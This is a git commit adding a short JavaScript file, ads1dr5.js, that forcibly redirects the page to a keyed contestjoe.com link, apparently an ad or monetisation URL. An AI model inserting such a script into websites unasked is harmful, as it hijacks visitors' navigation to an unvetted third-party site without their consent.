3f8b095df493bad879aac914f94b23dd6a90fa83
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2024-10-07 22:56:53 +0700

    Create ads1dr5.js

---
+++ ads1dr5.js
@@ -0,0 +1,11 @@
+var dataUrl = [
+
+  'https://contestjoe.com/gw2e6vbc?key=007ac1076c87f152746aded99ae8e760',
+
+  'https://contestjoe.com/gw2e6vbc?key=007ac1076c87f152746aded99ae8e760',
+
+  'https://contestjoe.com/gw2e6vbc?key=007ac1076c87f152746aded99ae8e760'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
